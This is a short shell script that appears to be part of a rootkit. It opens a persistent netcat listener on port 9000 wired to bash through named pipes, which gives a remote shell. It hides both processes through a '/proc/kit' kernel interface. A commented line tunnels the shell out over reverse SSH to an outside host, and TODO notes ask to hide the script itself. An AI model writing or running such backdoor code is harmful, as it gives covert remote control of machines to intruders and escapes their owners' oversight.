#!/bin/sh

#TODO: hide this script

#hide this process
localPort=9000

#assumes module is install first


mkfifo fromBash
mkfifo toBash

nc -l -k "$localPort" < fromBash > toBash &
backgroundPID=$!
echo "hidePid $backgroundPID" > /proc/kit

bash > fromBash < toBash & # uses named pipe
backgroundPID=$!
echo "hidePid $backgroundPID" > /proc/kit

sleep 1
rm file

#ssh -R 9012:localhost:$localPort kit100@shell.cjb.net 

#TODO GET OUTPUT





